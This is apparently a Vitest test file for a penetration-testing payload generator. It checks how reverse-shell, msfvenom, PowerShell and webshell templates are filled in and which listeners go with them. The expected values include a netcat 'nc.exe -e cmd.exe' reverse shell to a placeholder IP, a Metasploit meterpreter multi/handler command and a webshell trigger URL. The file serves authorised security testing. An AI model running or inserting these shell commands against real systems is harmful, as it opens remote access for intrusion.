import { describe, expect, it } from "vitest";
import { buildPayload, DERIVED_TOKENS } from "../../../engines/payloads/build";
import { utf16leBase64 } from "../../../engines/payloads/encode";
import { MSFVENOM } from "../../../engines/payloads/msfvenom";
import { POWERSHELL_TCP } from "../../../engines/payloads/psScripts";
import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";
import type { PayloadDef } from "../../../engines/payloads/types";
import { UPGRADE } from "../../../engines/payloads/upgrade";
import { CATALOGUE_BEFORE } from "./catalogueBefore";

describe("buildPayload blank values", () => {
  const nc = REVERSE_SHELLS.find((d) => d.id === "nc-exe")!;
  it("a blank or whitespace value falls back to the def default", () => {
    for (const FILE of ["", "   "]) {
      const b = buildPayload(nc, "cmd", { LHOST: "192.0.2.10", LPORT: "443", FILE });
      expect(b.text).toBe("C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443");
      expect(b.unresolved).toEqual([]);
    }
  });
  it("a blank value with no default is still unresolved", () => {
    expect(buildPayload(nc, "cmd", { LHOST: " ", LPORT: "443" }).unresolved).toEqual(["LHOST"]);
  });
});

describe("existing catalogue builds unchanged", () => {
  const V = { LHOST: "192.0.2.10", LPORT: "443" };
  const defs = [...REVERSE_SHELLS, ...MSFVENOM, ...UPGRADE];
  it("the snapshot covers every def and context", () => {
    expect(Object.keys(CATALOGUE_BEFORE).sort()).toEqual(defs.map((d) => d.id).sort());
    for (const d of defs) expect(Object.keys(CATALOGUE_BEFORE[d.id]!).sort()).toEqual([...d.contexts].sort());
  });
  for (const d of defs) {
    for (const ctx of d.contexts) {
      it(`${d.id} in ${ctx}`, () => {
        const b = buildPayload(d, ctx, V);
        const before = CATALOGUE_BEFORE[d.id]![ctx]!;
        expect(b.text).toBe(before.text);
        expect(b.prepare).toBe(before.prepare);
        expect(b.notes).toEqual(before.notes);
      });
    }
  }
  it("every reverse shell defaults to penelope under the Listener heading", () => {
    for (const d of REVERSE_SHELLS) {
      const b = buildPayload(d, d.contexts[0]!, V);
      expect(b.listener).toBe("penelope -O -p 443");
      expect(b.listenerId).toBe("penelope");
      expect(b.listenerHeading).toBe("Listener");
      expect(b.trigger).toBeNull();
      expect(b.notes).toContain("No penelope? rlwrap nc -lvnp 443");
    }
  });
  it("upgrade steps have no listener", () => {
    for (const d of UPGRADE) {
      const b = buildPayload(d, "bash-prompt", V);
      expect(b.listener).toBeNull();
      expect(b.listenerId).toBeNull();
    }
  });
  it("msfvenom defs carry their -p value as msfPayload", () => {
    for (const d of MSFVENOM) expect(d.template).toContain(`-p ${d.msfPayload} `);
  });
});

describe("listener choice", () => {
  const V = { LHOST: "192.0.2.10", LPORT: "443" };
  const bash = REVERSE_SHELLS.find((d) => d.id === "bash-tcp")!;
  it("opts.listener in the def's list is used", () => {
    const b = buildPayload(bash, "bash-prompt", V, { listener: "rlwrap-nc" });
    expect(b.listener).toBe("rlwrap nc -lvnp 443");
    expect(b.listenerId).toBe("rlwrap-nc");
    expect(b.notes).not.toContain("No penelope? rlwrap nc -lvnp 443");
  });
  it("opts.listener outside the def's list falls back to the first", () => {
    const b = buildPayload(bash, "bash-prompt", V, { listener: "ncat-ssl" });
    expect(b.listener).toBe("penelope -O -p 443");
    expect(b.listenerId).toBe("penelope");
  });
  it("the multi-handler listener sets the def's msfPayload", () => {
    const d: PayloadDef = { ...bash, id: "t-msf", listeners: ["multi-handler"], msfPayload: "linux/x64/meterpreter/reverse_tcp" };
    expect(buildPayload(d, "bash-prompt", V).listener).toBe(
      'msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.0.2.10; set LPORT 443; set ExitOnSession false; run -j"',
    );
  });
  it("a bind def's connect listener is headed Connect from Kali", () => {
    const d: PayloadDef = { ...bash, id: "t-bind", shape: "bind", listeners: ["connect-nc"] };
    const b = buildPayload(d, "bash-prompt", { ...V, TARGET_IP: "198.51.100.20", BIND_PORT: "4444" });
    expect(b.listener).toBe("rlwrap nc -nv 198.51.100.20 4444");
    expect(b.listenerHeading).toBe("Connect from Kali");
  });
});

describe("PS_B64", () => {
  const d: PayloadDef = {
    id: "t-psb64", generator: "shell", title: "t", os: "windows", contexts: ["cmd"], requires: [],
    template: "x {PS_B64}", parts: [], listeners: [],
  };
  it("fills once LHOST and LPORT are set", () => {
    const script = POWERSHELL_TCP.replace("{LHOST}", "192.0.2.10").replace("{LPORT}", "443");
    const b = buildPayload(d, "cmd", { LHOST: "192.0.2.10", LPORT: "443" });
    expect(b.text).toBe(`x ${utf16leBase64(script)}`);
    expect(b.unresolved).toEqual([]);
  });
  it("stays visible with LHOST blank, and LHOST is unresolved", () => {
    const b = buildPayload(d, "cmd", { LHOST: "", LPORT: "443" });
    expect(b.text).toContain("{PS_B64}");
    expect(b.unresolved).toContain("LHOST");
  });
  it("is a derived token", () => {
    expect(DERIVED_TOKENS.has("PS_B64")).toBe(true);
  });
});

describe("any-OS def wraps for opts.os", () => {
  const d: PayloadDef = {
    id: "t-any", generator: "shell", title: "t", os: "any", contexts: ["php-system"], requires: [],
    template: "id", parts: [], listeners: [],
  };
  it("linux (and the default) wraps with bash -c", () => {
    expect(buildPayload(d, "php-system", {}, { os: "linux" }).text).toBe("system('bash -c \\'id\\'');");
    expect(buildPayload(d, "php-system", {}).text).toBe("system('bash -c \\'id\\'');");
  });
  it("windows does not", () => {
    expect(buildPayload(d, "php-system", {}, { os: "windows" }).text).toBe("system('id');");
  });
});

describe("upload trigger", () => {
  const base: PayloadDef = {
    id: "t-up", generator: "shell", title: "t", os: "any", contexts: ["bash-prompt"], requires: [],
    template: "echo", parts: [], listeners: [], shape: "webshell",
    upload: { trigger: "http://{TARGET_IP}/{UPLOAD_PATH}/{FILE}?cmd=whoami" },
  };
  it("fills the trigger, trimming / and spaces from UPLOAD_PATH", () => {
    const b = buildPayload(base, "bash-prompt", { TARGET_IP: "198.51.100.20", UPLOAD_PATH: " /uploads/ ", FILE: "s.php" });
    expect(b.trigger).toEqual({ text: "http://198.51.100.20/uploads/s.php?cmd=whoami", unresolved: [] });
  });
  it("lists its own unresolved names", () => {
    const b = buildPayload(base, "bash-prompt", { FILE: "s.php", UPLOAD_PATH: "/" });
    expect(b.trigger!.unresolved).toEqual(["TARGET_IP", "UPLOAD_PATH"]);
    expect(b.trigger!.text).toBe("http://{TARGET_IP}/{UPLOAD_PATH}/s.php?cmd=whoami");
    expect(b.unresolved).toEqual([]);
  });
});
